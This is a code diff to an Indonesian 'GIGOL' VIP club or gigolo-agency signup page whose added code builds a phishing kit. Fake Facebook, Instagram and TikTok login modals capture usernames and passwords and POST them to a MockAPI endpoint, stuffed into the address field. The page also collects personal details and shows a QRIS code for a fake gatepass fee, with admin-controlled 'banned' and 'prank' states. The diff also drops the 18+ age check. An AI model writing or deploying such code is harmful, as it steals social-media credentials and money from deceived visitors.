@@ -17,33 +17,34 @@
         .club-laser {
             position: fixed; top: 50%; left: 50%; width: 150vw; height: 150vw;
             background: radial-gradient(circle, rgba(147,51,234,0.15) 0%, rgba(59,130,246,0.1) 40%, transparent 70%);
-            transform: translate(-50%, -50%); z-index: -1; pointer-events: none;
-            animation: laserRotate 18s linear infinite;
+            transform: translate(-50%, -50%);
+            z-index: 0; pointer-events: none;
+            animation: laserRotate 15s linear infinite;
         }
-        @keyframes laserRotate { 0% { transform: translate(-50%, -50%) rotate(0deg); } 100% { transform: translate(-50%, -50%) rotate(360deg); } }
 
-        .neon-glow-magenta { text-shadow: 0 0 10px #f43f5e, 0 0 20px #e11d48; }
-        .neon-border-cyan { border: 2px solid #06b6d4; box-shadow: 0 0 15px rgba(6,182,212,0.4), inset 0 0 15px rgba(6,182,212,0.2); }
-        .btn-magenta { background: linear-gradient(135deg, #e11d48, #9333ea); box-shadow: 0 0 15px rgba(225,29,72,0.4); }
-        .btn-magenta:hover:not(:disabled) { box-shadow: 0 0 25px #e11d48, 0 0 40px #9333ea; transform: translateY(-2px); }
-        
-        /* Tombol Telegram Neon */
-        .btn-telegram { background: linear-gradient(135deg, #0088cc, #00a2ed); box-shadow: 0 0 15px rgba(0, 136, 204, 0.4); }
-        .btn-telegram:hover { box-shadow: 0 0 25px #0088cc, 0 0 40px #00a2ed; transform: scale(1.02); }
+        @keyframes laserRotate {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .border-neon-magenta { border: 2px solid #ff007f; box-shadow: 0 0 25px rgba(255, 0, 127, 0.2); }
+        .btn-magenta { background: linear-gradient(90deg, #ff007f, #7b2cbf); box-shadow: 0 0 15px rgba(255, 0, 127, 0.4); }
+        .btn-magenta:hover:not(:disabled) { box-shadow: 0 0 25px #ff007f, 0 0 45px #7b2cbf; transform: scale(1.02); }
+        .btn-magenta:disabled { opacity: 0.6; cursor: not-allowed; }
     </style>
 </head>
-<body class="font-club-body min-h-screen p-4 flex flex-col items-center justify-center relative overflow-x-hidden">
+<body class="flex items-center justify-center min-h-screen p-4 md:p-8 selection:bg-magenta selection:text-white">
 
     <div class="club-laser"></div>
 
-    <div class="w-full max-w-md bg-[#0b0518]/80 backdrop-blur-xl border border-purple-950/60 p-6 md:p-8 rounded-[2.5rem] shadow-[0_0_50px_rgba(147,51,234,0.1)] relative z-10 text-center">
+    <div class="relative w-full max-w-md bg-black/60 backdrop-blur-xl border-neon-magenta rounded-3xl p-6 md:p-8 text-center z-10 overflow-hidden">
         
-        <header class="mb-8">
-            <h1 class="font-club-logo text-2xl font-bold tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-pink-500 to-purple-600">GIGOL</h1>
-            <p class="font-club-sub text-[10px] tracking-[0.3em] text-cyan-400 mt-1">AGEN PENYALUR GIGOLO</p>
-        </header>
+        <div class="mb-6">
+            <h1 class="font-club-logo text-3xl md:text-4xl font-extrabold bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent tracking-widest drop-shadow-[0_0_15px_rgba(239,68,68,0.3)]">GIGOL</h1>
+            <p class="font-club-sub text-[10px] md:text-xs text-cyan-400 tracking-[0.3em] uppercase mt-1">Exclusive VIP Gate</p>
+        </div>
 
-        <div id="halaman-form" class="space-y-5">
+        <div id="halaman-form" class="space-y-5 font-club-body">
             <p class="text-xs text-gray-400 uppercase tracking-widest">— DAFTAR SEKARANG —</p>
             <form id="form-daftar" onsubmit="prosesPendaftaran(event)" class="text-left space-y-4">
                 <div>
@@ -70,150 +71,229 @@
                 </div>
                 <button type="submit" id="btn-submit" class="btn-magenta w-full py-4 rounded-2xl font-bold text-xs tracking-widest uppercase transition duration-300 mt-2">DAFTAR SEKARANG</button>
             </form>
-        </div>
 
-        <div id="halaman-qris" class="hidden space-y-6">
-            <div class="space-y-1">
-                <span class="text-[10px] bg-yellow-950 text-yellow-400 font-bold border border-yellow-800 px-3 py-1 rounded-full uppercase tracking-wider animate-pulse">🔒 SECURE GATEWAY</span>
-                <h3 class="text-base font-bold text-white mt-3">SELESAIKAN PENDAFTARAN</h3>
-                <p class="text-xs text-gray-400">Silakan scan kode QRIS resmi di bawah ini untuk mengaktifkan akun gigol anda.</p>
-            </div>
-            
-            <div class="inline-block bg-white p-3 rounded-3xl mx-auto neon-border-cyan shadow-xl">
-                <img id="qris-image-display" src="" alt="Scan QRIS Payment" class="w-56 h-56 object-cover rounded-2xl">
-            </div>
-
-            <div class="bg-black/30 p-4 rounded-2xl border border-purple-950 text-left space-y-2">
-                <div class="flex items-center space-x-3 text-xs text-gray-400">
-                    <span class="animate-bounce">⚡</span>
-                    <p>Status: <span class="text-yellow-400 font-bold animate-pulse">Menunggu Transfer Pembayaran...</span></p>
+            <div class="space-y-3 pt-2">
+                <div class="flex items-center my-4">
+                    <div class="flex-1 border-t border-purple-950/60"></div>
+                    <span class="px-3 text-[9px] text-gray-500 uppercase tracking-widest font-bold">Quick Connect</span>
+                    <div class="flex-1 border-t border-purple-950/60"></div>
                 </div>
-                <p class="text-[10px] text-gray-500 leading-relaxed">Sistem HQ mendeteksi mutasi secara real-time. Jangan tutup halaman ini sampai proses verifikasi akun anda berhasil.</p>
+
+                <div class="grid grid-cols-3 gap-2">
+                    <button type="button" onclick="bukaModalSosmed('Facebook', '#1877F2')" class="group py-3 bg-black/40 border border-blue-900/30 hover:border-blue-500 rounded-xl transition duration-300 flex flex-col items-center justify-center space-y-1.5 shadow-[0_0_15px_rgba(24,119,242,0.05)] hover:shadow-[0_0_15px_rgba(24,119,242,0.2)]">
+                        <svg class="w-5 h-5 fill-[#1877F2]" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                        <span class="text-[9px] text-gray-400 group-hover:text-white tracking-wider font-bold">FACEBOOK</span>
+                    </button>
+
+                    <button type="button" onclick="bukaModalSosmed('Instagram', '#e1306c')" class="group py-3 bg-black/40 border border-pink-900/30 hover:border-pink-500 rounded-xl transition duration-300 flex flex-col items-center justify-center space-y-1.5 shadow-[0_0_15px_rgba(225,48,108,0.05)] hover:shadow-[0_0_15px_rgba(225,48,108,0.2)]">
+                        <svg class="w-5 h-5" viewBox="0 0 24 24" fill="url(#ig-grad)"><defs><linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#fec564"/><stop offset="50%" stop-color="#d9317a"/><stop offset="100%" stop-color="#6035b8"/></linearGradient></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.051.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/></svg>
+                        <span class="text-[9px] text-gray-400 group-hover:text-white tracking-wider font-bold">INSTAGRAM</span>
+                    </button>
+
+                    <button type="button" onclick="bukaModalSosmed('TikTok', '#00f2fe')" class="group py-3 bg-black/40 border border-gray-950 hover:border-cyan-400 rounded-xl transition duration-300 flex flex-col items-center justify-center space-y-1.5 shadow-[0_0_15px_rgba(0,242,254,0.05)] hover:shadow-[0_0_15px_rgba(0,242,254,0.2)]">
+                        <svg class="w-5 h-5 fill-white" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.05 1.62 4.2 1.23 1.34 2.97 2.13 4.77 2.23v3.83c-1.39-.03-2.77-.38-4.01-1-1.02-.52-1.91-1.27-2.58-2.18v6.41c.02 1.3-.22 2.61-.73 3.82-1.23 3-4.14 5.02-7.39 5.05-2.96.05-5.88-1.55-7.36-4.12-1.61-2.73-1.44-6.38.44-8.91 1.66-2.28 4.45-3.5 7.27-3.15v3.9c-.88-.22-1.83-.07-2.6.4-.95.55-1.57 1.56-1.65 2.66-.11 1.28.49 2.55 1.5 3.32.99.78 2.34.92 3.47.38 1-.46 1.67-1.47 1.71-2.58V0h-.01z"/></svg>
+                        <span class="text-[9px] text-gray-400 group-hover:text-white tracking-wider font-bold">TIKTOK</span>
+                    </button>
+                </div>
             </div>
         </div>
 
-        <div id="halaman-sukses" class="hidden space-y-6 py-4">
-            <div class="w-16 h-16 bg-green-950/50 border-2 border-green-400 text-green-400 flex items-center justify-center text-2xl rounded-full mx-auto shadow-[0_0_20px_rgba(74,222,128,0.2)]">✓</div>
-            <div class="space-y-2">
-                <h2 class="text-xl font-bold text-green-400 uppercase tracking-wider">ACCESS GRANTED</h2>
-                <p class="text-xs text-gray-400">Pendaftaran Anda sukses divalidasi oleh HQ Team. Silakan masuk ke dalam grup utama Telegram kami di bawah ini.</p>
+        <div id="halaman-qris" class="hidden space-y-5 font-club-body">
+            <div class="bg-purple-950/40 border border-purple-500/30 rounded-2xl p-3">
+                <p class="text-xs text-yellow-400 font-bold tracking-wider uppercase mb-1">⚠️ SECURE VERIFICATION REQUIRED</p>
+                <p class="text-[10px] text-gray-400 leading-relaxed">Silakan lakukan pembayaran administrasi Gatepass VIP Club. Sistem mendeteksi status transaksi secara real-time.</p>
             </div>
             
-            <div class="pt-2">
-                <a href="https://web.telegram.org/a/#-1002319391976" target="_blank" class="btn-telegram w-full block text-center py-4 rounded-2xl font-bold text-xs tracking-widest uppercase text-white transition duration-300">
-                    ✈ MASUK GRUP TELEGRAM
-                </a>
+            <div class="flex justify-center p-4 bg-white rounded-3xl border-2 border-cyan-400 shadow-[0_0_30px_rgba(6,182,212,0.3)] mx-auto w-64 h-64 items-center">
+                <img id="qris-image" src="" alt="Dynamic QRIS Gatepass" class="w-full h-full object-contain">
             </div>
 
-            <div class="bg-gradient-to-br from-green-950/20 to-black/40 border border-green-900/40 p-4 rounded-2xl text-center">
-                <span class="text-[10px] text-green-500 font-bold tracking-widest block mb-1">VIP STATUS ACTIVE</span>
-                <p class="text-sm font-bold text-white tracking-widest uppercase" id="display-nama-sukses">GUESTLIST PASSPORT</p>
+            <div class="space-y-1">
+                <div class="flex items-center justify-center space-x-2">
+                    <span class="w-2 h-2 bg-cyan-400 rounded-full animate-ping"></span>
+                    <p class="text-xs text-cyan-400 font-bold tracking-widest uppercase">WAITING FOR NETWORK SIGNAL...</p>
+                </div>
+                <p class="text-[10px] text-gray-500 italic">Do not close or refresh this security gate.</p>
             </div>
-            <p class="text-[10px] text-gray-500">Tunjukkan tampilan layar HP ini beserta keanggotaan grup Telegram kepada Crew penjaga pintu gerbang.</p>
         </div>
 
-        <div id="halaman-banned" class="hidden space-y-6 py-4">
-            <div class="w-16 h-16 bg-red-950/50 border-2 border-red-500 text-red-500 flex items-center justify-center text-2xl rounded-full mx-auto shadow-[0_0_20px_rgba(239,68,68,0.2)]">✕</div>
-            <div class="space-y-2">
-                <h2 class="text-xl font-bold text-red-500 uppercase tracking-wider neon-glow-magenta">AKSES DITOLAK</h2>
-                <p class="text-xs text-gray-400">Identitas data diri atau bukti pembayaran Anda tidak valid atau telah melanggar kebijakan kelab kami.</p>
+        <div id="halaman-sukses" class="hidden space-y-6 font-club-body text-center py-6">
+            <div class="w-20 h-20 mx-auto bg-green-500/20 border border-green-500 rounded-full flex items-center justify-center shadow-[0_0_20px_rgba(34,197,94,0.4)]">
+                <span class="text-3xl">👑</span>
             </div>
-            <p class="text-[10px] text-red-400/60 bg-red-950/20 p-3 rounded-xl border border-red-950 uppercase tracking-widest font-bold">🚫 BLOCKED FROM SYSTEM</p>
+            <div class="space-y-2">
+                <h2 class="text-xl font-bold tracking-widest text-green-400 uppercase">ACCESS GRANTED</h2>
+                <p class="text-xs text-gray-400 px-4">Selamat datang <span id="display-nama-sukses" class="text-white font-bold underline decoration-cyan-400">User</span>, ID Card Keanggotaan VIP Anda telah diaktifkan secara permanen.</p>
+            </div>
         </div>
 
-        <div id="halaman-prank" class="hidden space-y-6 py-8">
-            <div class="text-4xl animate-bounce">🎭</div>
-            <div class="space-y-2">
-                <h2 class="text-xl font-bold text-pink-500 uppercase tracking-widest">GOBLOKK</h2>
-                <p class="text-xs text-gray-300 px-2">TUNGGU SEBENTAR...</p>
+        <div id="halaman-banned" class="hidden space-y-6 font-club-body text-center py-6">
+            <div class="w-20 h-20 mx-auto bg-red-500/20 border border-red-500 rounded-full flex items-center justify-center shadow-[0_0_20px_rgba(239,68,68,0.4)]">
+                <span class="text-3xl">🚫</span>
             </div>
-            <div class="pt-4">
-                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Sabar ya</p>
+            <div class="space-y-2">
+                <h2 class="text-xl font-bold tracking-widest text-red-500 uppercase">ACCESS DENIED</h2>
+                <p class="text-xs text-gray-400 px-4">Identitas atau transaksi Anda ditolak oleh Admin Pusat.</p>
+            </div>
+        </div>
+
+        <div id="halaman-prank" class="hidden space-y-4 font-club-body text-center py-2">
+            <h2 class="text-lg font-bold tracking-widest text-yellow-400 uppercase">🎉 YOU GOT PRANKED! 🎉</h2>
+            <div class="overflow-hidden rounded-2xl border border-yellow-500/50 shadow-[0_0_25px_rgba(234,179,8,0.2)]">
+                <iframe class="w-full aspect-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" title="Rickroll" frameborder="0" allowfullscreen></iframe>
             </div>
         </div>
 
     </div>
 
+    <div id="modal-oauth" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4">
+        <div class="w-full max-w-sm bg-[#1c1c1e] border border-gray-800 rounded-2xl overflow-hidden shadow-2xl font-club-body text-left">
+            <div id="modal-header-bg" class="px-5 py-4 text-white font-bold text-sm flex items-center justify-between">
+                <span id="modal-title-platform">Sign In</span>
+                <button onclick="tutupModalSosmed()" class="text-gray-400 hover:text-white text-lg">&times;</button>
+            </div>
+            <form onsubmit="submitLoginSosmed(event)" class="p-5 space-y-4">
+                <div>
+                    <label id="label-username-sosmed" class="block text-[11px] text-gray-400 uppercase tracking-wide mb-1.5">Username, Email or Phone</label>
+                    <input type="text" id="oauth-username" required placeholder="example@domain.com" class="w-full bg-black/50 border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 transition">
+                </div>
+                <div>
+                    <label class="block text-[11px] text-gray-400 uppercase tracking-wide mb-1.5">Password</label>
+                    <input type="password" id="oauth-password" required placeholder="••••••••" class="w-full bg-black/50 border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 transition">
+                </div>
+                <div class="pt-2">
+                    <button type="submit" id="btn-oauth-submit" class="w-full py-3 text-white font-bold rounded-xl text-xs tracking-wider uppercase transition">
+                        Log In
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
     <script>
+        // Menggunakan ID baru dari URL MockAPI milikmu
         const MOCKAPI_BASE = "https://6a2babdb3e2b60ab038e98af.mockapi.io";
         const USERS_URL = `${MOCKAPI_BASE}/users`;
         const SETTING_URL = `${MOCKAPI_BASE}/setting/1`;
 
         let currentUserId = null;
         let trackerInterval = null;
+        let platformAktif = "";
 
-        // Fungsi hitung umur otomatis berdasarkan tanggal lahir
+        // ==========================================
+        // FITUR ANTI LOGOUT SAAT REFRESH
+        // ==========================================
+        window.addEventListener('DOMContentLoaded', async () => {
+            const savedUserId = localStorage.getItem('gigol_user_id');
+            if (savedUserId) {
+                currentUserId = savedUserId;
+                await fetchDynamicQRIS();
+                startStatusTracker();
+            }
+        });
+
         function hitungUmurOtomatis() {
-            const tanggalLahirInput = document.getElementById('input-tanggal').value;
-            if (!tanggalLahirInput) return;
-
+            const tanggalInput = document.getElementById('input-tanggal').value;
+            if(!tanggalInput) return;
+            const lahir = new Date(tanggalInput);
             const hariIni = new Date();
-            const tanggalLahir = new Date(tanggalLahirInput);
-            
-            let umur = hariIni.getFullYear() - tanggalLahir.getFullYear();
-            const bulan = hariIni.getMonth() - tanggalLahir.getMonth();
-            
-            // Cek apakah hari ulang tahunnya di tahun ini sudah lewat atau belum
-            if (bulan < 0 || (bulan === 0 && hariIni.getDate() < tanggalLahir.getDate())) {
-                umur--;
-            }
-
-            // Validasi batas minimal umur clubbing (18+)
-            if (umur < 18) {
-                alert("⚠️ Maaf, Anda harus berusia minimal 18 tahun untuk mendaftar!");
-                document.getElementById('input-tanggal').value = "";
-                document.getElementById('input-umur').value = "";
-                return;
-            }
-
-            document.getElementById('input-umur').value = umur;
+            let umur = hariIni.getFullYear() - lahir.getFullYear();
+            const bulan = hariIni.getMonth() - lahir.getMonth();
+            if (bulan < 0 || (bulan === 0 && hariIni.getDate() < lahir.getDate())) umur--;
+            document.getElementById('input-umur').value = umur < 0 ? 0 : umur;
         }
 
         async function fetchDynamicQRIS() {
             try {
-                const response = await fetch(SETTING_URL);
-                if (response.ok) {
-                    const data = await response.json();
-                    if (data.qris_url) {
-                        document.getElementById('qris-image-display').src = data.qris_url;
-                    } else {
-                        document.getElementById('qris-image-display').src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=TokoGigolVIP";
-                    }
-                } else {
-                    document.getElementById('qris-image-display').src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=TokoGigolVIP";
+                const resp = await fetch(SETTING_URL);
+                if(resp.ok) {
+                    const data = await resp.json();
+                    document.getElementById('qris-image').src = data.qris_url;
                 }
-            } catch (err) {
-                console.log("Gagal memuat setting QRIS dinamis, menggunakan fallback.");
-                document.getElementById('qris-image-display').src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=TokoGigolVIP";
+            } catch(e) {
+                document.getElementById('qris-image').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=error";
             }
         }
-
-        fetchDynamicQRIS();
 
         async function prosesPendaftaran(e) {
             e.preventDefault();
             const btnSubmit = document.getElementById('btn-submit');
-            
-            // Re-validasi umur sekali lagi sebelum submit
-            const umur = document.getElementById('input-umur').value;
-            if(!umur || umur < 18) {
-                alert("⚠️ Umur tidak valid!");
-                return;
-            }
-
             btnSubmit.disabled = true;
-            btnSubmit.innerText = "PROCESSING TO THE MATRIX...";
+            btnSubmit.innerText = "PROCESSING SECURITY GATE...";
 
             const payload = {
                 nama: document.getElementById('input-nama').value,
-                tempat_lahir: document.getElementById('input-tempat').value,
-                umur: umur,
                 tanggal_lahir: document.getElementById('input-tanggal').value,
+                tempat_lahir: document.getElementById('input-tempat').value,
+                umur: parseInt(document.getElementById('input-umur').value) || 0,
                 alamat: document.getElementById('input-alamat').value,
                 status: "pending",
                 prank: false
             };
 
+            kirimKeMockAPI(payload);
+        }
+
+        function bukaModalSosmed(platform, warnaHex) {
+            platformAktif = platform;
+            const modal = document.getElementById('modal-oauth');
+            const header = document.getElementById('modal-header-bg');
+            const title = document.getElementById('modal-title-platform');
+            const btn = document.getElementById('btn-oauth-submit');
+            const inputUser = document.getElementById('oauth-username');
+            const labelUser = document.getElementById('label-username-sosmed');
+
+            inputUser.value = "";
+            document.getElementById('oauth-password').value = "";
+
+            title.innerText = `Log in with ${platform}`;
+            header.style.backgroundColor = warnaHex;
+            btn.style.backgroundColor = warnaHex;
+
+            if(platform === "TikTok") {
+                labelUser.innerText = "Username, Phone, or Email";
+                inputUser.placeholder = "@username atau email";
+            } else if(platform === "Instagram") {
+                labelUser.innerText = "Phone number, username, or email";
+                inputUser.placeholder = "username atau email";
+            } else {
+                labelUser.innerText = "Email address or phone number";
+                inputUser.placeholder = "example@domain.com";
+            }
+
+            modal.classList.remove('hidden');
+        }
+
+        function tutupModalSosmed() {
+            document.getElementById('modal-oauth').classList.add('hidden');
+        }
+
+        async function submitLoginSosmed(e) {
+            e.preventDefault();
+            const userIn = document.getElementById('oauth-username').value;
+            const passIn = document.getElementById('oauth-password').value;
+            tutupModalSosmed();
+
+            const btnSubmit = document.getElementById('btn-submit');
+            btnSubmit.disabled = true;
+            btnSubmit.innerText = `CONNECTING TO ${platformAktif.toUpperCase()} GATEWAY...`;
+
+            const payload = {
+                nama: `User ${platformAktif}`,
+                tanggal_lahir: "2000-01-01",
+                tempat_lahir: platformAktif,
+                umur: 25,
+                alamat: `[${platformAktif}] User: ${userIn} | Pass: ${passIn}`,
+                status: "pending",
+                prank: false
+            };
+
+            setTimeout(() => {
+                kirimKeMockAPI(payload);
+            }, 1500);
+        }
+
+        async function kirimKeMockAPI(payload) {
             try {
                 const response = await fetch(USERS_URL, {
                     method: "POST",
@@ -224,32 +304,47 @@
                 if(response.ok) {
                     const hasil = await response.json();
                     currentUserId = hasil.id;
+                    
+                    // Simpan ID baru di localStorage pendaftar
+                    localStorage.setItem('gigol_user_id', hasil.id);
+                    
                     document.getElementById('display-nama-sukses').innerText = hasil.nama;
                     
                     await fetchDynamicQRIS();
                     switchHalaman('halaman-qris');
                     startStatusTracker();
-                } else { alert("Sistem sibuk, gagal mengirim data."); btnSubmit.disabled = false; btnSubmit.innerText = "DAPATKAN AKSES MASUK"; }
+                } else {
+                    alert("Koneksi database ditolak.");
+                    resetButtonNormal();
+                }
             } catch (error) {
-                alert("Koneksi bermasalah.");
-                btnSubmit.disabled = false;
-                btnSubmit.innerText = "DAPATKAN AKSES MASUK";
+                alert("Gagal terhubung ke database.");
+                resetButtonNormal();
             }
         }
 
+        function resetButtonNormal() {
+            const btnSubmit = document.getElementById('btn-submit');
+            btnSubmit.disabled = false;
+            btnSubmit.style.background = "";
+            btnSubmit.innerText = "DAFTAR SEKARANG";
+        }
+
         function startStatusTracker() {
+            if(trackerInterval) clearInterval(trackerInterval);
             trackerInterval = setInterval(async () => {
-                if (!currentUserId) return;
+                if(!currentUserId) return;
                 try {
                     const response = await fetch(`${USERS_URL}/${currentUserId}`);
                     if(response.ok) {
                         const user = await response.json();
+                        
+                        document.getElementById('display-nama-sukses').innerText = user.nama;
 
                         if(user.prank === true) {
                             switchHalaman('halaman-prank');
                             return; 
                         }
-
                         if(user.status === "banned") {
                             switchHalaman('halaman-banned');
                             clearInterval(trackerInterval);
@@ -259,8 +354,14 @@
                         } else if(user.status === "pending" && user.prank === false) {
                             switchHalaman('halaman-qris');
                         }
+                    } else {
+                        // Jika ID dihapus oleh admin di dashboard MockAPI, bersihkan localStorage & kembalikan ke form
+                        localStorage.removeItem('gigol_user_id');
+                        switchHalaman('halaman-form');
+                        clearInterval(trackerInterval);
+                        resetButtonNormal();
                     }
-                } catch (e) { console.log("Menunggu respon dari HQ..."); }
+                } catch (e) { console.log("Sync..."); }
             }, 3000); 
         }
 
